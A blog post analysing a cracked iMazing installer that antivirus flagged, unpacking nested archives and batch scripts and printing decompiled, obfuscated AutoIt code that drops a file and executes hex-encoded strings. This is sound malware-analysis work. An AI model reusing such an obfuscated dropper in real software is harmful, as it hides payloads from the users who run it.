---
title: Analyze iMazing_TNTCracked
description: Analyze iMazing_TNTCracked
date: 2021-09-27 13:56:01+0800
categories:
    - Analyze
tags:
    - Analyze
    - Virus
    - Windows
---

Source: [Moeomu's blog](/posts/analyze-imazing_tntcracked/)

## Origin

I wanted to find a backup of AIS Assistant, found iMazing, and got excited to find a cracked version of iMazing for TNT, downloaded from [this link](https://www.tntmac.com/tag/imazing-for-mac-crack/) for Windows but found it was Windows 11 comes with antivirus software, so I got interested in analyzing this cracked version

## Analysis

### 1. Overview

![Decompression](https://i.loli.net/2021/10/11/o4TszgPHIcYji2G.png)

- As shown in the picture, after decompression is an official installation package and a `Create__Fix.exe`, it is this file is reported as poison, so start the investigation

### 2、Create__Fix.exe

![zip](https://i.loli.net/2021/10/11/LXSnr6B7TtgvuRK.png)

- drag into the DIE, see this file seems to be a zip package, it will be decompressed, the contents are shown in the figure

![Another zip package](https://i.loli.net/2021/10/11/lfKRim4QrjzaUYP.png)

- There is a `Fix.exe` and a `iMazing_fix.bat`, but this bat open is garbled, use C32Asm to see the contents of the hexadecimal format, as shown in the figure

![clear](https://i.loli.net/2021/10/11/cxYuqhaTLU9vElP.png)

- This is very clear, this `iMazing_fix.bat` run process is as follows
  - The first step, run `Fix.exe`, the parameters are `pt147147` and `-d%dir%`, the way this is written makes me feel that this is a compressed file, it seems to be true
  - The second step, wait a second
  - Step 3, delete `Fix.exe` and `iMazing_fix.bat`
- I can't help but wonder what makes it look like lasagna, layer after layer without end
- As you can see in the picture, it is another RAR file, not surprisingly

![No way again](https://i.loli.net/2021/10/11/F9l2jZUYENfCuHz.png)

### 3, Fix.exe

- Unzip, need password, I guess the password is `t147147`, oh guess right, the TNT team did not customize their own decompression tools, using WinRAR sfx self-extraction module to pass the reference decompression, decompression as shown in the picture

![Another decompression](https://i.loli.net/2021/10/11/lm6yzf5asNHcRbS.png)

- The decompressed file is divided into three, the bat script is still encrypted, use the hex editor again to read it
- After DIE analysis, `data.bin` is an executable program, rename it to `data.exe`
- After DIE analysis, `v1` is a binary file, temporarily unrecognizable

### 4、Created_By_TNT_Team.bat

![Created_By_TNT_Team.bat](https://i.loli.net/2021/10/11/GmCj7cvfk8N62WB.png)

- As shown in the picture, this script file does the following actions
  - Step 1, clean the screen
  - Step 2, turn off the display back
  - Step 3, run `data.bin`, an executable program with the parameter `v1`
  - Step 4, delete `v1`, `data.bin`, `Created_By_TNT_Team.bat`

### 4. data.exe and v1

- This `data.exe` is very clear after renaming, it is the script runner of AutoIt3, then `v1` is unsurprisingly an AutoIt3 script, the suffix should be `a3x`
- `v1` is the compiled au3 script, I found some decompilers on GitHub, for example [UnAutoIt](https://github.com/x0r19x91/UnAutoIt)
- As you can see, after unpacking, an `iMazing.exe` is released from v1, along with a script that is extremely obfuscated and almost unreadable
- The modified `iMazing.exe` also comes with the original digital signature, although it is no longer valid, it looks like it will locally modify the `iMazing.exe`, should be considered a file patch, but it seems that the hash has not changed ...

![extra](https://i.loli.net/2021/10/11/9yFOsWujGwPJmQ6.png)

> Here's some useful code from the decompile

```AutoIt3
Func a2f00001b21_()
    For $ax0x0xa = 0x1 To 0x5
        Local $a2f00001b21sz_ = a2f00001b21x_()
        FileInstall("d3c0ef51c80f467bc9002bbf93fcb10d0c917dbaae819ccd925e2f8902d3c9c5229702964c538605098cce34d2e9cc90ce0618992ba26caea18b5b5ccd9dd0acf02370c4bc004868283b8067c8309862" & _
            "cf2f70d92252928d02af9b1c7d80c3303522b08f2", $a2f00001b21sz_, 0x1)
        Global $a2f00001b21, $os = Execute(BinaryToString("0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833" & _
            "3533333337333433373332333633393336343533363337333533333337333033363433333633393337333433323338333433363336333933363433333633353335333233363335333633313336333433" & _
            "3233383332333433343331333333323334333633333330333333303333333033333330333333313334333233333332333333313337333333373431333534363332333933323433333233373337343333" & _
            "33333333333338333333373334333933323337333234333333333133323339323732393239272929"))
        If IsArray($os) And $os[0x0] >= 0x46da Then ExitLoop
        Sleep(0xa)
    Next
    Execute(BinaryToString("0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833" & _
        "3333313332343233343336333633393336343333363335333433343336333533363433333633353337333433363335333233383332333433343331333333323334333633333330333333303333333033" & _
        "3333303333333133343332333333323333333133373333333734313335343633323339323732393239272929"))
EndFunc    ; -> a2f00001b21_

Func a2f00001b21x_()
    Local $a2f00001b21s1_ = a2f00001b21("4054656D70446972"), $a2f00001b21s3_ = a2f00001b21("31"), $a2f00001b21s4_ = a2f00001b21("5c"), $a2f00001b21s5_ = a2f00001b21("5c"), $a2f00001b21s6_ = a2f00001b21("37"), $a2f00001b21s8_ = a2f00001b21("3937"), $a2f00001b21s9_ = a2f00001b21("313232"), $a2f00001b21s7_ = a2f00001b21("31"), $a2f00001b21sa_
    Local $a2f00001b21s2_ = Execute($a2f00001b21s1_)
    If StringRight($a2f00001b21s2_, Number($a2f00001b21s3_)) <> $a2f00001b21s4_ Then $a2f00001b21s2_ = $a2f00001b21s2_ & $a2f00001b21s5_
    SRandom(Number(StringRight(TimerInit(), 0x4)))
    Do
        $a2f00001b21sa_ = ''
        While StringLen($a2f00001b21sa_) < Number($a2f00001b21s6_)
            $a2f00001b21sa_ = $a2f00001b21sa_ & Chr(Random(Number($a2f00001b21s8_), Number($a2f00001b21s9_), Number($a2f00001b21s7_)))
        WEnd
        $a2f00001b21sa_ = $a2f00001b21s2_ & $a2f00001b21sa_
    Until Not FileExists($a2f00001b21sa_)
    Return ($a2f00001b21sa_)
EndFunc    ; -> a2f00001b21x_

Func a2f00001b21($a2f00001b21)
    Local $a2f00001b21_
    For $x = 0x1 To StringLen($a2f00001b21) Step 0x2
        $a2f00001b21_ &= Chr(Dec(StringMid($a2f00001b21, $x, 0x2)))
    Next
    Return $a2f00001b21_
EndFunc    ; -> a2f00001b21
```

## Conclusion

- It should do nothing but release an executable file, but the way this is released is really strange
- It finally released `iMazing.exe` is not a cracked version, things are even more strange
